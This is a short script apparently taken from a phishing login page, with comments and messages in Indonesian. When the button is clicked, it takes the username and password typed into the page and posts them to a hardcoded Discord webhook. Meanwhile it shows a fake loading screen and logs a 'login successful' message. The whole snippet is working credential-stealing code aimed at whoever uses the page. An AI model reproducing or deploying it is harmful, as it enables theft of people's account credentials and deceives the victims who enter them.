<script>
   //LOG DISCORD
  const webhookURL = "https://discord.com/api/webhooks/1167176384255373395/fCtNBwIQ9zNC78K6IfOfH00XYqCj82A5GJeOrd1-2JX602Yl0lruJSL9ZzNK_3gT1SZG";
  document.getElementById("button").addEventListener("click", () => {
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    const loadingOverlay = document.getElementById("loading-overlay");
    loadingOverlay.style.display = "flex";

    const loadingText = document.querySelector(".loading-text");
    loadingText.style.display = "block";

    const message = `MENCOBA LOGIN NICHH USER: ${username} PASSWORD: ${password}`;
    sendToDiscordWebhook(message);
  });

  function sendToDiscordWebhook(message) {
    const requestData = {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({ content: message })
    };

    fetch(webhookURL, requestData)
      .then(response => {
        setTimeout(() => {
          const loadingOverlay = document.getElementById("loading-overlay");
          loadingOverlay.style.display = "none";

          if (response.ok) {
            console.log(" Berhasil login");
          } else {
            console.error(" GAGAL login");
          }
        }, 10000);
      })
      .catch(error => {
        const loadingOverlay = document.getElementById("loading-overlay");
        loadingOverlay.style.display = "none";

        console.error("Terjadi kesalahan:", error);
      });
  }
</script>
